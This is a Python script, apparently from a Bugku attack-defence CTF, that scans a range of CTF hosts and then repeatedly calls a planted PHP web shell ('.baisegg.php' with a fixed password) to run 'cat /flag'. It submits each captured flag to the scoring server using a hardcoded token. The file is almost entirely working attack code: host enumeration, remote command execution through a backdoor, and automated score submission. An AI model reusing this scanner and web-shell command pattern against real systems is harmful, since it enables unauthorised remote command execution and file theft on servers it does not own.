import requests
import urllib3
import random
import re
urllib3.disable_warnings()
user_agent = [
    'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30',
    'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)',
    'Opera/9.80 (Windows NT 5.1; U; zh-cn) Presto/2.9.168 Version/11.50',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)'
]
headers = {
    "User-Agent": random.choice(user_agent),
    'Connection': 'close'
}
def test():
    for t in range(1,254):
        url0 = "http://192-168-1-{}.pvp711.bugku.cn".format(t)
        try:
            response = requests.get(url0,verify=False,timeout=2)
            status=response.status_code
            if status == 200:
                print("此网站存在"+url0)
                fo = open('url.txt', "a+")
                fo.write(url0+'\n')
                fo.close()
        except Exception as e:
            print('网站无法访问')
test()
def main():
    while True:
        for line in open('url.txt','r'):
            line=line.rstrip("\n")
            url = line+"/data/.baisegg.php?pass=wzgnb&a=system('cat /flag')"
            try:
                geturl = requests.get(url=url,headers=headers,verify=False,timeout=5)
                html = geturl.text
                status=geturl.status_code
                if status == 200:
                    pattern =re.findall(r'flag{.*}',html)[0]
                    print('is a flag:'+pattern)
                    url1="https://ctf.bugku.com/pvp/submit.html?token=d8faf8ddfdad8ddeaee614b474bf9374&flag={}".format(pattern)
                    response = requests.get(url1,verify=False,timeout=5,headers=headers)
                    print('自动刷分成功,目标为:'+line)
                else:   
                    print("网站无法正常访问"+line)
            except Exception as e:
                print('{} 未知错误'.format(url))
main()